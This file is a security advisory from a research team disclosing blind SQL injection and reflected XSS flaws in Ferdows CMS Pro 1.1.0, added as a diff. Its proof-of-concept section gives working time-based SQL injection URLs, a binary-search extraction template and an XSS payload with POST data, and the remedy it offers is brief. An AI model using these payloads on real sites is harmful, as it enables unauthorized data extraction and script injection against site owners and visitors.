@@ -1,0 +1,101 @@
+########################## www.BugReport.ir 
+#######################################
+#
+# AmnPardaz Security Research Team
+#
+# Title: Ferdows CMS Pro <=1.1.0 Multiple Vulnerabilities
+# Vendor: www.fcms.ir
+# Exploit: Available
+# Vulnerable Version: 1.1.0 (Pro)
+# Impact: Medium
+# Original Advisory: http://www.bugreport.ir/index_77.htm
+# Fix: N/A
+###################################################################################
+
+####################
+1. Description:
+####################
+
+Ferdows CMS is a complete, fully featured CMS in ASP.NET language and 
+using AJAX technology with MSSQL and became a powerful CMS having plenty 
+of strong modules.
+This CMS is not open-source and is accessible for private use by the 
+author company for designing their customer's websites.
+
+####################
+2. Vulnerabilities:
+####################
+
+2.1. Injection Flaws. Blind SQL Injection in "/about.aspx" and 
+"/archive.aspx" and
+"/default1.aspx" in "siteid" parameter.
+2.1.1. Exploit:
+Check the exploit/POC section.
+
+2.2. Injection Flaws. Blind SQL Injection in "/archive.aspx" in "sid" 
+parameter.
+2.2.1. Exploit:
+Check the exploit/POC section.
+
+2.3. Cross Site Scripting (XSS). Reflected XSS attack in 
+"/showdata.aspx" in "dataid"
+parameter. (Post Method)
+2.3.1. Exploit:
+Check the exploit/POC section.
+
+####################
+3. Exploits/PoCs:
+####################
+
+Original Exploit URL: http://www.bugreport.ir/77/exploit.htm
+
+3.1. Injection Flaws. Blind SQL Injection in "/about.aspx" and 
+"/archive.aspx" and
+"/default1.aspx" in "siteid" parameter.
+3.2. Injection Flaws. Blind SQL Injection in "/archive.aspx" in "sid" 
+parameter.
+-------------
+Check database username:
+http://[URL]/default1.aspx?siteid=1'; IF SYSTEM_USER='sa' waitfor delay 
+'00:00:10'--
+http://[URL]/archive.aspx?sid=19&siteid=1'; IF SYSTEM_USER='sa' waitfor 
+delay
+'00:00:10'--
+http://[URL]/archive.aspx?sid=19'; IF SYSTEM_USER='sa' waitfor delay
+'00:00:10'--&siteid=1
+
+Binary Search Exploits:
+http://[URL]/about.aspx?siteid=1'; IF ASCII(SUBSTRING((?),i,1)) > k 
+waitfor delay
+'00:00:10'--
+
+Note: In last POC, i is the i-th byte returned by the one-row subquery 
+(?) and k is the
+current middle value of the binary search.
+
+-------------
+3.3. Cross Site Scripting (XSS). Reflected XSS attack in 
+"/showdata.aspx" in "dataid"
+parameter. (POST METHOD)
+-------------
+http://[URL]/showdata.aspx?dataid=%22%20onmouseover%3Dprompt%28%27XSS-from-BugReport%27%29%20continue%3D%22&siteid=1
+
+__EVENTARGUMENT=&__EVENTTARGET=&__EVENTVALIDATION=%2fwEWBQKh%2f8jADgKprNPRAQKe%2b%2bCDCwKY38eYCQLRmu35DOB6MkYbirW%2fduDB97KKNKznAXjO&__VIEWSTATE=%2fwEPDwUKMTc1Nzk5Nzk1MGQYAgU0Y3RsMDAkQ29udGVudFBsYWNlSG9sZGVyMSRWaWV3cG9pbnQxJENhcHRjaGFDb250cm9sMQ8FJDc4OTg0YzkzLThiOWQtNDczZi04OTExLWYwZjcxODRiODFiOWQFMWN0bDAwJENvbnRlbnRQbGFjZUhvbGRlcjEkVmlld3BvaW50MSRHVl9WaWV3UG9pbnQPPCsACgEIZmTsHHUhMC543Vq3m%2fWANPP5J1edvw%3d%3d&ctl00%24ContentPlaceHolder1%24Viewpoint1%24CaptchaControl1=&ctl00%24ContentPlaceHolder1%24Viewpoint1%24sendvp=%d8%a7%d8%b1%d8%b3%d8%a7%d9%84&ctl00%24ContentPlaceHolder1%24Viewpoint1%24tx_body=&ctl00%24ContentPlaceHolder1%24Viewpoint1%24tx_email=sample@email.tst&ctl00%24ContentPlaceHolder1%24Viewpoint1%24tx_name=testt
+-------------
+
+
+
+
+####################
+4. Solution:
+####################
+
+Edit the source code to ensure that inputs are properly sanitized.
+
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.com
